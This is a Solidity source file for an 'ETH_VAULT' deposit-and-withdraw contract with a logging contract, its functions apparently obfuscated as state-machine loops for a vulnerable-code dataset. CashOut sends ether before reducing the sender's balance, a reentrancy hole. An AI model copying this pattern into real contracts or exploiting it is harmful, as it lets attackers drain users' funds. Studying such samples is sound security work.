pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public balances;

    uint public MinDeposit = 1 ether;

    Log TransferLog;

    function ETH_VAULT(address _log)
    public 
    {
        TransferLog = Log(_log);
    }

    function Deposit()
    public
    payable
    {
        uint _state = 0;
        while(true) {
            if(_state == 0) {
                if(msg.value > MinDeposit) {
                    _state = 1;
                } else {
                    break;
                }
            } else if(_state == 1) {
                balances[msg.sender]+=msg.value;
                _state = 2;
            } else if(_state == 2) {
                TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
                break;
            }
        }
    }

    function CashOut(uint _am)
    public
    payable
    {
        uint _state = 0;
        while(true) {
            if(_state == 0) {
                if(_am<=balances[msg.sender]) {
                    _state = 1;
                } else {
                    break;
                }
            } else if(_state == 1) {
                if(msg.sender.call.value(_am)()) {
                    _state = 2;
                } else {
                    break;
                }
            } else if(_state == 2) {
                balances[msg.sender]-=_am;
                _state = 3;
            } else if(_state == 3) {
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
                break;
            }
        }
    }

    function() public payable{}    

}

contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        uint _state = 0;
        while(true) {
            if(_state == 0) {
                LastMsg.Sender = _adr;
                _state = 1;
            } else if(_state == 1) {
                LastMsg.Time = now;
                _state = 2;
            } else if(_state == 2) {
                LastMsg.Val = _val;
                _state = 3;
            } else if(_state == 3) {
                LastMsg.Data = _data;
                _state = 4;
            } else if(_state == 4) {
                History.push(LastMsg);
                break;
            }
        }
    }
}